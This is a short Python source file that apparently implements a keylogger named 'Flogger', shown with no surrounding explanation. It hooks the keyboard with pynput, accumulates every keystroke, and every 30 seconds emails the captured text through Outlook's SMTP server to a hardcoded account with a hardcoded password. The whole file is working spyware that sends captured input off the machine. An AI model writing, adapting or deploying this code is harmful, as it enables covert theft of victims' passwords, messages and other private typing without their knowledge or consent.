import pynput.keyboard
import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
 
 
log = ""
 
 
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
 
 
def send_email(email, password, message):
    email_server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()
 
def thread_function():
    global log
    if len(log) > 10:
        message = MIMEMultipart("")
        message["Subject"] = "Flogger"
 
        part1 = MIMEText(log, "plain")
        message.attach(part1)
        msg = message.as_string()
 
        send_email("deneme@outlook.com", "deneme123", msg)
 
        log = ""
 
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
 
 
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 
 
 
with keylogger_listener:
    thread_function()
    keylogger_listener.join()